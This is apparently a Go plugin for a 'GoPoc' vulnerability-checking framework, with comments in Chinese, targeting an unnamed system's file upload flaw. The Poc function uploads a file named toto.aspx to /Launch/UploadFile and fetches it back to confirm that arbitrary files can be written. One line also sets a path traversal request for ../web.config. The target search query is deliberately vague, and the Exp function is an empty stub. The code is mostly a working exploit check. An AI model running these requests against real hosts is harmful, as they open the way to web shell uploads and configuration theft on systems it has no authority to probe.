package User

import (
	"GoPoc/main/Developer/AllFormat"
	"GoPoc/main/Developer/HttpAbout"
	"GoPoc/main/User/Utils"
	"strings"
)

var Json string
var Poc func(hostInfo string) bool
var Exp func(expResult Format.ExpResult) Format.ExpResult

// 为避嫌, fofa语句乱填的
func init() {
	Json = `{
	"VulnName":"某系统文件上传漏洞",
	"CheckIP":"true",
	"Coroutine":"10",
	"File":"",
    "Fofa":"product=\"xxx\"",
 	"Url":"",
   "Request":{

		"Method": "",

		"Uri": [
	   			],

		"Header":{
			"Accept-Encoding":"gzip"
		}
	},

   "Response":{

		"Operation":"",

		"Group":[

				{

                    "Regexp": "",
			        "Header":{
			            },

			        "Body":[
			            ]
			    },

          		 {
			        "Header":{
			            }
			    }
			]

}
}`

	// 发送探测包
	sendDetectionPath455445 := func(hostInfo string) (Format.CustomResponseFormat, error) {
		config := HttpAbout.NewHttpConfig()
		config.Uri = "/Launch/Download?FilePath=../web.config"
		// 自动赋值请求方法为 POST
		Utils.FullyAutomaticFillingHeader(config, `POST /Launch/UploadFile?FileName=toto.aspx&Version=1&Size=100 HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279Content-Length: 3

123`) // 挂代理抓个包扔进来这个方法,将自动给请求头赋值(除了Host/UA,Host自动修改为hostInfo,UA不指定会自动生成),不用再手动一个个添加请求头
		config.Body = `123` // 请求体内容为 123
		return HttpAbout.SendHttpRequest(hostInfo, config)
	}

	getReturn352435 := func(hostInfo string) (Format.CustomResponseFormat, error) {
		config := HttpAbout.NewHttpConfig()
		config.Uri = "/Launch/Client/toto.aspx"
		// 自动赋值请求方法为 GET
		Utils.FullyAutomaticFillingHeader(config, `GET /Launch/UploadFile?FileName=toto.aspx&Version=1&Size=100 HTTP/1.1
Host: 127.0.0.1
Accept-Language: zh-CN
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br`) // 挂代理抓个包扔进来这个方法,将自动给请求头赋值(除了Host/UA,Host自动修改为hostInfo,UA不指定会自动生成),不用再手动一个个添加请求头
		config.Body = `123` // 请求体内容为 123
		return HttpAbout.SendHttpRequest(hostInfo, config)
	}

	// 如果使用代码模式, Poc函数为必须,其中的参数固定
	Poc = func(hostInfo string) bool {
		resp, err := sendDetectionPath455445(hostInfo)
		if err != nil {
			return false
		}
		if !strings.Contains(resp.Status, "200") { // 如果响应码不包含 200 字样,则返回 false
			return false
		}
		resp, err = getReturn352435(hostInfo)
		if err != nil {
			return false
		}
		return strings.Contains(resp.Body, "123") // 如果响应包包含 123 字样,则返回 true
	}

	// 如果使用代码模式, Exp函数为必须,其中的参数固定
	// Exp 你可以尝试自己写一下:
	Exp = func(expResult Format.ExpResult) Format.ExpResult {
		return expResult
	}
}
